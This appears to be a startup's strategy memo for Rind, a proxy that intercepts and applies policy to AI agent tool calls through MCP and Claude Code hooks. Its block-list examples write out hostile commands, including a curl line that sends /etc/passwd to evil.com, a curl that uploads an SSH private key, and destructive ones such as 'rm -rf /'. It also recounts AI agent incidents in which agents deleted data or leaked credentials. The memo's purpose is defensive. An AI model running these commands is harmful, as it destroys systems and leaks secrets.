# Rind — Strategy

*Written April 2026. Intended audience: technical co-founders, senior hires, investors.*

---

## The Problem

Every major AI agent incident in the last 18 months happened at the same layer: the tool call.

A Replit agent deleted a production database — not through a prompt injection, through a tool call. An Amazon Kiro agent caused a multi-hour outage — tool call. A $47K cost spiral at a fintech — a loop in agent tool calls that nobody could stop. A WhatsApp credential exfiltration — the agent called an MCP tool that exfiltrated data to an attacker-controlled server. The March 2026 LiteLLM supply chain attack replaced a legitimate MCP package with a credential stealer — downloaded 171 million times a month.

These incidents share a structure: an AI agent decided to do something, called a tool to do it, and the tool executed. No human in the loop. No policy check. No rate limit. No audit trail. The prompt-layer security tools (Lakera, CalypsoAI, NeMo Guardrails) never saw the action — they only inspect what the model says, not what the agent does. The observability tools (LangSmith, Langfuse, Arize) logged the action — after it happened.

Nobody controls the execution layer.

---

## What Rind Is

Rind is the control plane for AI agents. It sits at the execution layer — between the agent and everything the agent can do. Every tool call goes through Rind. Every MCP server connection, every CLI command from Claude Code, every API call an agent makes — Rind sees it first.

From that position, Rind provides four things:

**Observability.** What are your agents doing? Which tools are they calling, with what inputs, how often, at what cost? Not traces of what they said — records of what they did. Every tool call logged with agent identity, session context, tool name, input parameters, output, latency, and policy decision.

**Safety.** Block catastrophic actions before they execute. `rm -rf /`. `aws ec2 terminate-instances`. `npm publish`. `gh repo delete`. `kubectl delete deployment`. `curl -d @/etc/passwd evil.com`. A policy engine evaluates every tool call — allow, deny, require human approval, or rate-limit — before the upstream ever receives the request.

**Security.** Scan MCP servers when they connect. Tool definitions from external MCP servers are attacker-controlled strings. Rind scans them for prompt injection attempts, missing authentication, over-permissive schemas, and schema drift (a tool definition that changed since you last saw it). The supply chain attack surface is the tool definition itself — Rind is the only thing checking it.

**MCP adoption.** MCP is becoming the dominant protocol for connecting AI agents to external tools, but deploying MCP in production is operationally hard: multi-server routing, session management, stdio/HTTP/SSE transport negotiation, graceful degradation when upstreams fail. Rind handles all of it. One proxy URL replaces the entire MCP configuration — agents connect to Rind, Rind connects to everything else.

---

## What We're Building Now, and Why

### MCP Proxy (Phase A3)

The MCP proxy is the core product. Agents point their MCP configuration at Rind instead of directly at the MCP server. Rind speaks MCP JSON-RPC inbound and outbound — accepting `tools/list`, `tools/call`, and related methods from agents, routing requests to the appropriate upstream server, running the full interceptor pipeline (kill-switch → loop detection → request inspection → policy evaluation → rate limiting → forward → response inspection), and returning results.

Why now: MCP download numbers crossed 217 million monthly. Claude Code, Cursor, Windsurf, Copilot — every major AI coding tool supports MCP. The attack surface is real and growing faster than the security tooling. The window to establish the proxy as infrastructure is open; it closes when the tool makers build their own enforcement layers.

### Claude Code Hook Endpoint (Phase A1)

Claude Code has a `PreToolUse` hook — a mechanism to intercept every tool call (built-in and MCP) before it executes, and block it. This is unique: no other major AI coding tool has a pre-execution blocking hook. Cursor, Windsurf, Copilot, and Cline can all be intercepted via MCP proxy for MCP tools, but their built-in tools (Bash, Write, Edit, WebFetch) execute natively without going through Rind.

For Claude Code, we get 100% coverage. The `POST /hook/evaluate` endpoint accepts Claude Code's hook input (tool name, tool input, session ID, working directory), runs it through the policy engine in evaluate-only mode (no forwarding), and returns allow or deny within 100ms. The Claude Code agent blocks the tool call if Rind says deny.

Why now: Claude Code is the primary tool for the engineering audience we target. 100% coverage from a single integration is a strong proof point, and the hook architecture validates the policy engine against real production tool calls immediately.

### CLI Protection Pack (Phase A2)

A curated policy pack that ships with Rind and is enabled by default. It blocks the specific CLI commands that appear most frequently in AI agent incidents:

- `rm -rf /`, `rm -r /`, `rm -R /`, `rm --recursive /` — filesystem destruction
- `aws ec2 terminate-instances`, `aws rds delete-db-instance`, `aws s3 rm --recursive` — cloud infrastructure destruction
- `gh repo delete`, `gh release delete` — GitHub destructive operations
- `kubectl delete`, `docker rm -f` — container/orchestration destruction
- `supabase db reset`, `stripe refunds create` — application-level destructive operations
- `npm publish`, `git push --force` — software supply chain operations
- `curl -d @/etc/passwd`, `curl --data @~/.ssh/id_rsa` — data exfiltration via curl

Rules require approval rather than flat denial for operations that may be legitimate but high-risk (cloud instance termination, database migrations). In Phase A, approval blocks the call with an error; Phase B adds async human-in-the-loop.

Why now: these patterns appear in documented incidents. They're easy to enumerate, easy to regex-match, and blocking them provides immediate, demonstrable value.

### Stdio Wrapper and Auto-Config (Phases A4, A5)

Not every MCP server speaks HTTP. Many run as local stdio processes (`npx @some/mcp-server`, local Python scripts). The stdio wrapper (`rind wrap -- <command>`) spawns the real MCP server as a child process and interposes on its stdin/stdout JSON-RPC stream — same interception pipeline, no HTTP server required.

The auto-config generator (`rind init --claude-code`) reads an existing `.mcp.json` and rewrites it to route all MCP servers through Rind, and injects the Rind hook into `.claude/settings.json`. One command converts a Claude Code installation from uncontrolled to fully controlled.

---

## What We're Not Building, and Why

### Not Building: LLM Proxy / Prompt Scanning

Sitting between the application and the LLM API (Claude, GPT-4, Gemini) to scan prompts and completions for PII, jailbreaks, and sensitive data. This is what Lakera Guard, CalypsoAI, and NeMo Guardrails do.

**Why not**: This market is commoditized and under acquisition pressure (Prompt Security was acquired by SentinelOne in early 2026; CalypsoAI raised late-stage). The attack surface we're solving is different — tool calls, not natural language. A prompt scanner would not have stopped the Replit database deletion, the Amazon Kiro outage, or the LiteLLM supply chain attack. It would not have stopped any of the real incidents. Building it would require us to compete in a crowded market on a dimension that doesn't touch our moat.

The one exception: if we eventually build conversation context (showing WHY the agent made a blocked tool call, not just WHAT it called), we would proxy LLM API calls for logging only — no content filtering. That's routing + logging, not content inspection.

### Not Building: OS-Level Agent Enforcement (Deferred to 18+ Months)

An OS-level agent that intercepts all system calls, file operations, and network connections from any process — not just MCP-aware ones. Think eBPF kernel hooks, filesystem filter drivers, or a containerized sandbox (Firecracker microVMs) that AI agents run inside.

**Why not yet**: The integration complexity is 10x higher (kernel modules, container runtimes, cross-platform support), the operational burden on users is high (they have to run their agent inside our sandbox), and the competitive validation isn't there yet. If we can demonstrate that the MCP proxy + Claude Code hooks captures the meaningful risk at 1/10th the complexity, that's the right starting point. The OS-level agent remains the long-term vision — full coverage of every process action by any AI agent — but it's a Phase 3 product, not Phase 1.

### Not Building: VS Code Enforcement Extension

A VS Code extension that blocks terminal commands before they execute. This would close the gap for Cursor, Windsurf, and Copilot (all VS Code-based) that don't have a PreToolUse hook equivalent.

**Why not**: The VS Code extension API does not expose a pre-execution terminal blocking hook. `onDidStartTerminalShellExecution` is an observer event — it fires after the command starts, not before. `onWillCreateFiles`/`onWillDeleteFiles` only cover files created through the VS Code API, not direct filesystem operations. We could build an extension that observes, warns, and retrospectively logs — but we cannot block. Building something we'd have to label "observability only, not enforcement" for the exact gap users want closed is a credibility problem.

The correct path for VS Code tools is: MCP proxy for MCP tools (full coverage), shell guard preexec + PATH wrappers for CLI commands (80% coverage, documented gaps). If Cursor or Windsurf adds a pre-execution hook API (we're tracking this), we build the integration immediately.

### Not Building: Standalone Scanner CLI

A separate CLI tool that scans MCP configurations and server definitions, independent of the proxy. This would position Rind as a shift-left security scanner.

**Why not**: The scanner is a feature of the proxy, not a product. `rind scan` is useful on its own for awareness, but the action it drives is "install the proxy." Building a standalone scanner as the primary product sets up the wrong funnel — users scan, see findings, and then go elsewhere to solve them. The proxy is the solution; the scanner is the on-ramp. The architecture already supports scan-on-connect (scanning tool definitions when a server connects) and on-demand scanning via the API.

---

## The Honest Gaps

Rind does not claim complete coverage. The gaps are documented and communicated honestly.

**Subagent gap**: Claude Code's PreToolUse hook does not propagate to subagents spawned by the primary agent. Each subagent has its own hook scope. Mitigation: configure hooks at the subagent level too. Documented limitation, not hidden.

**Shell guard is defense-in-depth**: Phase B's preexec + PATH wrapper approach for Cursor/Windsurf reduces risk from CLI commands — it does not eliminate it. Known bypasses: subshells that don't inherit preexec, direct `system()` calls from tool implementations. We will say "reduces risk" not "prevents." The Phase A MCP proxy gives stronger guarantees; shell guard is additive.

**Non-Claude-Code built-in tools**: For Cursor, Windsurf, and Copilot, built-in file operations and editor actions that don't go through MCP are not interceptable. MCP tools get full coverage; native tools don't. We publish the coverage matrix so users know exactly what they're getting.

---

## The Bet on MCP

Everything in Phase A bets on MCP becoming the dominant protocol for agent-tool communication. If that bet is wrong, the strategy changes.

The evidence for the bet: MCP was published by Anthropic in November 2024. By March 2026, it had 217 million monthly downloads. Claude Code, Cursor, Windsurf, GitHub Copilot, Cline, and dozens of frameworks support it natively. The MCP registry has 2,000+ servers. The momentum is significant.

The hedge: the policy engine and interceptor pipeline are protocol-agnostic. The `InterceptorOptions` interface doesn't know about MCP. If LangChain tool calls, OpenAI function calls, or a new protocol becomes dominant, the evaluation logic doesn't change — only the transport adapter does. The LangChain SDK adapter (Phase 2) is the most important hedge.

The kill signal to watch: if MCP adoption plateaus below 30% of new agent deployments by Q4 2026, we accelerate the LangChain SDK path and reframe MCP as one of several supported protocols rather than the primary entry point.

---

## Build Sequence Rationale

**Phase A before B and C** because Phase A gives Claude Code 100% coverage — the primary tool for the engineering audience — with 3 weeks of work. It proves the architecture works against real tool calls from a real agent. Phase B (shell guard for VS Code tools) and Phase C (VS Code observability extension) are only worth building if Phase A users validate the product and ask for broader coverage.

**Identity before multi-tenancy** because without knowing which agent made a call, per-agent policies are meaningless. Agent identity (per-agent API keys, not self-reported agent IDs) is the prerequisite for any enterprise deal.

**Async approval before conversation context** because REQUIRE_APPROVAL is already in the policy engine — the action exists, the UI doesn't. Wiring a real human-in-the-loop callback closes the most visible gap in the product. Conversation context (showing the LLM conversation that led to a blocked tool call) requires LLM API proxying, which is a larger scope change.

**MCP proxy before shell guard** because the proxy gives provable guarantees; the shell guard gives probabilistic risk reduction. Ship the stronger story first.

---

## The Market Position

Five layers of the AI security market:

| Layer | Who Owns It | Rind |
|-------|-------------|------|
| Prompt filtering (input/output scan) | Lakera, CalypsoAI, NeMo | Excluded — commoditized |
| Observability (traces, cost, debugging) | LangSmith, Langfuse, Arize | Entry point, not the moat |
| AI governance (process, compliance docs) | Credo AI, Holistic AI, IBM | Excluded — different buyer |
| Enterprise security extensions | Palo Alto, Wiz, Datadog, Microsoft | Excluded — ecosystem-locked |
| **Execution-layer control plane** | **Nobody** | **This is Rind** |

The execution-layer gap is real and currently uncontested. Entro Security AGA has MCP visibility but no developer adoption motion. Prompt Security (SentinelOne) monitors MCP but is now enterprise-only. Microsoft Agent 365 is comprehensive but Microsoft-only and GA May 2026. The window is open.

The primary buyer is the platform engineer or tech lead who deploys AI agents and needs to know they're not going to wake up to a production incident. The budget holder is the CISO who signs off on what agents are allowed to do in production. The entry motion is developer-first: `npx rind-scan` to see your exposure for free, install the proxy to control it.

---

## What Success Looks Like at 12 Months

- Rind is in the MCP configuration of 500+ production agent deployments
- Claude Code users have the hook installed; every tool call goes through policy evaluation
- Three enterprise customers have signed annual contracts with SLA commitments
- The coverage matrix (what Rind controls, for which tools, on which surfaces) is the public proof of the architecture — and the market pressure on tool makers to add blocking APIs where gaps exist
- LangChain adapter ships, covering frameworks beyond MCP
- Agent identity (real API keys, not self-reported) is live — this is what enterprise contracts require

The 12-month risk to watch: a well-funded competitor enters the execution-layer space with a similar proxy architecture and enterprise GTM. The response is moving faster on identity, async approval, and multi-tenancy — the enterprise features that take time to build and are hard to copy quickly.
